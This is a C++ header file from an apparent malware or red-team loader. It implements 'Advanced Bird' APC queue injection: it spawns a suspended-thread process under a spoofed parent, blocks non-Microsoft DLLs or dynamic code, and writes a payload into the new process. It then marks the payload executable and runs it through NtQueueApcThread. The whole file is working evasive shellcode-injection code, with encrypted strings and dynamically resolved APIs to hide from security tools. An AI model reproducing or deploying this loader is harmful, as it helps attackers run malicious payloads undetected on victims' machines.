#pragma once

#include <Windows.h>
#include "Config.h"
#include "Helpers.h"

// "Advanced Bird" APC Queue Code Injection
// ------------------------------------------------------------------------

BOOL advanced_bird_injection(LPSTR payload, SIZE_T payloadLen, DWORD pid) {
	// Init some important stuff
	STARTUPINFOEXA sie;
	PROCESS_INFORMATION pi;
	ZeroMemory(&sie, sizeof(sie));
    ZeroMemory(&pi, sizeof(pi));

	// Required for a STARTUPINFOEXA
    sie.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    sie.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    // Get the size of our PROC_THREAD_ATTRIBUTE_LIST to be allocated
    SIZE_T size = 0;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);

    // Allocate memory for PROC_THREAD_ATTRIBUTE_LIST
    sie.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Initialise our list 
    InitializeProcThreadAttributeList(sie.lpAttributeList, 2, 0, &size);

#ifdef ACG
    // Assign ACG attribute
    DWORD64 ACGPolicy = PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
    UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &ACGPolicy, 8, NULL, NULL);
#else
    // Assign CIG/blockdlls attribute
    DWORD64 CIGPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &CIGPolicy, 8, NULL, NULL);
#endif

    // Initializing OBJECT_ATTRIBUTES and CLIENT_ID struct
    OBJECT_ATTRIBUTES pObjectAttributes;
    InitializeObjectAttributes(&pObjectAttributes, NULL, 0, NULL, NULL);
    CLIENT_ID pClientId;
    pClientId.UniqueProcess = (PVOID)pid;
    pClientId.UniqueThread = (PVOID)0;

    // Opening a handle to the parent process to enable PPID spoofing
    HANDLE hParentProcess;
    NTSTATUS status = NtOpenProcess(&hParentProcess, PROCESS_CREATE_PROCESS, &pObjectAttributes, &pClientId);
    if (hParentProcess == NULL) {
        return FALSE;
    }

    // Assign PPID Spoof attribute
    UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);

    // Delete PROC_THREAD_ATTRIBUTE_LIST
    DeleteProcThreadAttributeList(sie.lpAttributeList);

    // Dynamically resolve some functions
    HMODULE kernel32 = GetModuleHandleA("Kernel32.dll");
    
    using SuspendThreadPrototype = DWORD(WINAPI *)(HANDLE);
    SuspendThreadPrototype SuspendThread = (SuspendThreadPrototype)GetProcAddress(kernel32, "SuspendThread");
    
    using CreateProcessAPrototype = BOOL(WINAPI *)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    CreateProcessAPrototype CreateProcessA = (CreateProcessAPrototype)GetProcAddress(kernel32, "CreateProcessA");
    
    // Create the target process
    std::string spawn = decrypt_string(SPAWN);
    if (!CreateProcessA((LPSTR)spawn.c_str(), NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
    	return FALSE;

    // Get handle to process and primary thread
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;

    // Suspend the primary thread
	SuspendThread(hThread);

    // Allocating a RW memory buffer for the payload in the target process
    LPVOID pAlloc = NULL;
    SIZE_T uSize = payloadLen; // Store the payload length in a local variable
    status = NtAllocateVirtualMemory(hProcess, &pAlloc, 0, &uSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != STATUS_SUCCESS) {
        return FALSE;
    }

    // Writing the payload to the created buffer
    status = NtWriteVirtualMemory(hProcess, pAlloc, payload, payloadLen, NULL);
    if (status != STATUS_SUCCESS) {
        return FALSE;
    }

    // Change page protections of created buffer to RX so that payload can be executed
	ULONG oldProtection;
	LPVOID lpBaseAddress = pAlloc;
	status = NtProtectVirtualMemory(hProcess, &lpBaseAddress, &uSize, PAGE_EXECUTE_READ, &oldProtection);
	if (status != STATUS_SUCCESS) {
		return FALSE;
	}

    // Assigning the APC to the primary thread
	status = NtQueueApcThread(hThread, (PIO_APC_ROUTINE)pAlloc, pAlloc, NULL, NULL);
	if (status != STATUS_SUCCESS) {
        return FALSE;
    }

    // Resume the thread
	DWORD ret = ResumeThread(pi.hThread);
	if (ret == 0XFFFFFFFF)
		return FALSE;

	return TRUE;
}